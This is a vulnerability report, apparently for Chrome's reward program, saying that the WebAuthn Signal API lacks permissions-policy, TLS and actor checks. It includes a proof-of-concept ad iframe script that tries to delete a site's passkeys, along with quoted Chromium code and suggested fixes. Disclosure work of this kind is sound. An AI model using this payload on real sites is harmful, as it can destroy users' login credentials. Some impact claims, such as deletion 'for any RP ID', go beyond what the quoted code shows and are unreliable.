# VRP Report: WebAuthn Signal API (navigator.credentials.report) Missing Security Checks

## Title

WebAuthn Signal API bypasses TLS verification, permissions policy, and actor checks — enables cross-origin passkey deletion from ad iframes

## Severity

Medium (WebAuthn security model violation)

## Component

Blink > WebAuthentication

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all Chrome versions with Signal API support.

## Summary

The WebAuthn Signal API (`navigator.credentials.report()`) is missing three security checks enforced by all other WebAuthn operations:

1. **No TLS certificate verification** (`IsSecurityLevelAcceptableForWebAuthn` not called)
2. **No cross-origin permissions policy enforcement** (unconditional SUCCESS for all iframes)
3. **No `ShouldDisallowCredentialRequest` gate**

This allows a cross-origin iframe (e.g., ad content) to invoke the Signal API to delete or modify the user's passkeys, without requiring any permissions policy delegation from the embedding page.

## Steps to Reproduce

### 1. Embedding page (victim.com/index.html)

```html
<!DOCTYPE html>
<html>
<body>
<h1>News Article</h1>
<!-- Ad iframe from different origin -->
<iframe src="https://evil-ad.example/ad.html" width="300" height="250"></iframe>
</body>
</html>
```

### 2. Cross-origin ad iframe (evil-ad.example/ad.html)

```html
<!DOCTYPE html>
<html>
<body>
<script>
// This cross-origin iframe can invoke the Signal API without any
// permissions policy - unlike MakeCredential or GetAssertion which
// require publickey-credentials-create/get permissions policy.

async function deletePasskeys() {
  try {
    // Signal that no credentials are accepted for victim.com
    // This tells Chrome to delete passkeys for this RP ID
    await navigator.credentials.report({
      type: "public-key",
      action: "allAcceptedCredentials",
      relyingPartyId: "victim.com",
      allAcceptedCredentialIds: []  // empty = all should be deleted
    });
    console.log("Signal sent - passkeys may be deleted");
  } catch (e) {
    console.log("Error:", e);
  }
}

deletePasskeys();
</script>
</body>
</html>
```

### Expected Result

The cross-origin iframe should be blocked from invoking the Signal API because:
- There is no `publickey-credentials-*` permissions policy on the iframe
- The embedding page did not delegate any WebAuthn permissions

### Actual Result

The Signal API call proceeds because `ValidateAncestorOrigins` unconditionally returns SUCCESS for `RequestType::kReport`:

```cpp
// webauth_request_security_checker.cc:139-142
// TODO(crbug.com/347727501): Add a permissions policy for report.
if (type == RequestType::kReport) {
    return blink::mojom::AuthenticatorStatus::SUCCESS;
}
```

## Root Cause Analysis

### 1. Missing permissions policy (webauth_request_security_checker.cc:139-142)

```cpp
// TODO(crbug.com/347727501): Add a permissions policy for report.
if (type == RequestType::kReport) {
    return blink::mojom::AuthenticatorStatus::SUCCESS;
}
```

Other request types require explicit permissions policy:
- `kMakeCredential` → `publickey-credentials-create` (line 110-115)
- `kGetAssertion` → `publickey-credentials-get` (line 116-120)
- `kMakePaymentCredential` → `publickey-credentials-create` OR `payment` (line 124-132)
- `kGetPaymentCredentialAssertion` → `payment` (line 134-137)
- **`kReport` → NONE REQUIRED** (line 139-142)

### 2. Missing TLS check (authenticator_common_impl.cc)

```cpp
// Present in MakeCredential (line 1158):
if (!GetContentClient()->browser()->IsSecurityLevelAcceptableForWebAuthn(
        render_frame_host, req_state_->caller_origin)) { ... }

// Present in GetAssertion (line 1722):
if (!GetContentClient()->browser()->IsSecurityLevelAcceptableForWebAuthn(
        render_frame_host, req_state_->caller_origin)) { ... }

// ABSENT from Report() (line 2124-2167) and
// ContinueReportAfterRpIdCheck (line 2169+)
```

### 3. Missing actor check (authenticator_common_impl.cc)

```cpp
// Present in MakeCredential (line 1093):
if (GetContentClient()->browser()->ShouldDisallowCredentialRequest(
        render_frame_host)) { ... }

// Present in GetAssertion (line 1556):
if (GetContentClient()->browser()->ShouldDisallowCredentialRequest(
        render_frame_host)) { ... }

// ABSENT from Report() (line 2124-2167)
```

## Security Impact

### 1. Cross-origin passkey deletion

A cross-origin iframe (ad, widget, analytics) can signal `allAcceptedCredentials: []` for any RP ID, potentially causing Chrome to mark all passkeys for that RP as invalid and delete them.

### 2. Passkey metadata manipulation under MITM

Without TLS verification, a MITM attacker can call `currentUserDetails` to change passkey display names and usernames, potentially confusing the user about which account a passkey belongs to.

### 3. Silent background operation

No focus check means background tabs can continuously invoke the Signal API.

## Suggested Fix

1. **Add permissions policy**: Create `publickey-credentials-report` or reuse `publickey-credentials-get` for the Signal API
2. **Add TLS check**: Call `IsSecurityLevelAcceptableForWebAuthn()` in Report() path
3. **Add actor check**: Call `ShouldDisallowCredentialRequest()` in Report() path
4. **Consider focus requirement**: For destructive signals (allAcceptedCredentials, unknownCredentialId)

## PoC

Inline above. The key observation is that `navigator.credentials.report()` succeeds from a cross-origin iframe without any permissions policy delegation, unlike all other WebAuthn operations.
